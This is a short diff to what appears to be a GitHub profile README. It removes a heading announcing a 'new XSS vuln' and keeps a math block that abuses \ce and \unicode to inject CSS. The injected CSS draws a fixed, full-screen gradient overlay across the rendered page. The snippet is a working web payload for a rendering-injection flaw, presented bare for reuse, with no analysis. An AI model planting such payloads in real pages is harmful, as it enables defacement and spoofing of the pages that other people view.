@@ -1,5 +1,3 @@
-## hi there 👋 new XSS vuln just dropped
-
 ```math
 \ce{$&#x5C;unicode[goombafont; color:blue; pointer-events: none; z-index: -10; position: fixed; top: 0; left: 0; height: 100vh; width: 100%; background-image: linear-gradient(to bottom, #87CEEB, #1E90FF); opacity: 0.8;]{x0000}$} 
 
